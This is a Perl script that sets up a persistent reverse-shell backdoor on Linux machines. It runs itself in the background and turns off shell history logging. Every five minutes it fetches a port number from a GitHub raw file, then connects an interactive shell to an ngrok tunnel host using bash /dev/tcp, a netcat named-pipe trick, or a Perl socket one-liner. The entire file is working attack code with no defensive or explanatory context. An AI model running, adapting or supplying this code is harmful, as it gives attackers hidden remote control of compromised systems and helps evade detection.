#!/usr/bin/perl
# DYNAMIC PORT FROM GITHUB - WORKS ON ALPINE & DEBIAN

my $HOST = "0.tcp.ap.ngrok.io";
my $PORT_URL = "https://raw.githubusercontent.com/tsecnetworkmyid/akses/refs/heads/main/tes.txt";
my $CYCLE_TIME = 300;  # 5 menit

# ============ DAEMONIZE ============
exit if fork();  # Run in background
chdir "/tmp";

# ============ DISABLE LOGGING ============
$ENV{'HISTFILE'} = '/dev/null';
$ENV{'HISTSIZE'} = '0';

# ============ MAIN LOOP ============
while (1) {
    # Get dynamic port from GitHub
    my $port = get_port_from_github($PORT_URL);
    
    print "[*] Using port: $port\n" if -t STDOUT;
    
    # Clean previous processes
    cleanup_old_processes();
    
    # Launch appropriate reverse shell
    launch_reverse_shell($HOST, $port);
    
    # Wait for next cycle
    sleep($CYCLE_TIME);
}

# ============ SUBROUTINES ============

sub get_port_from_github {
    my ($url) = @_;
    my $port = 16702;  # Default fallback
    
    # Try curl first
    if (`which curl 2>/dev/null`) {
        my $content = `curl -s --connect-timeout 10 "$url" 2>/dev/null`;
        if ($content) {
            $content =~ s/\D//g;  # Extract only numbers
            $port = $content if $content >= 1 && $content <= 65535;
        }
    }
    # Try wget
    elsif (`which wget 2>/dev/null`) {
        my $content = `wget -qO- --timeout=10 "$url" 2>/dev/null`;
        if ($content) {
            $content =~ s/\D//g;
            $port = $content if $content >= 1 && $content <= 65535;
        }
    }
    # Pure Perl download (no external tools)
    else {
        $port = perl_download_port($url) || $port;
    }
    
    return $port;
}

sub perl_download_port {
    my ($url) = @_;
    
    eval {
        # Simple HTTP GET via Perl
        $url =~ m|https?://([^/]+)(/.*)|;
        my ($host, $path) = ($1, $2 || '/');
        
        socket(my $sock, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
        my $port = $url =~ /^https/ ? 443 : 80;
        
        my $addr = inet_aton($host);
        if ($addr && connect($sock, sockaddr_in($port, $addr))) {
            # Send HTTP request
            my $request = "GET $path HTTP/1.0\r\nHost: $host\r\nUser-Agent: curl\r\n\r\n";
            send($sock, $request, 0);
            
            # Read response
            my $response = '';
            while (my $data = <$sock>) {
                $response .= $data;
                last if $response =~ /\r\n\r\n/;
            }
            
            # Extract body (port number)
            if ($response =~ /\r\n\r\n(.*)/s) {
                my $body = $1;
                $body =~ s/\D//g;
                return $body if $body >= 1 && $body <= 65535;
            }
        }
    };
    
    return undef;
}

sub cleanup_old_processes {
    system("pkill -f 'bash.*ngrok.io' 2>/dev/null");
    system("pkill -f 'nc.*ngrok.io' 2>/dev/null");
    system("pkill -f 'sh.*-i' 2>/dev/null");
}

sub launch_reverse_shell {
    my ($host, $port) = @_;
    
    # Fork untuk reverse shell
    my $pid = fork();
    
    if ($pid == 0) {
        # Child process
        
        # Method 1: Try bash (Debian)
        if (`which bash 2>/dev/null` && !`grep -i alpine /etc/os-release 2>/dev/null`) {
            exec("bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'");
        }
        # Method 2: Try netcat (Alpine)
        elsif (`which nc 2>/dev/null`) {
            exec("rm -f /tmp/.r; mkfifo /tmp/.r; cat /tmp/.r | /bin/sh -i 2>&1 | nc $host $port > /tmp/.r");
        }
        # Method 3: Pure Perl (universal fallback)
        else {
            exec("perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($port,inet_aton(\"$host\")));open STDIN,\"<&S\";open STDOUT,\">&S\";open STDERR,\">&S\";exec \"/bin/sh -i\"'");
        }
        exit(0);
    }
}

# Clean exit handler
END {
    cleanup_old_processes();
}
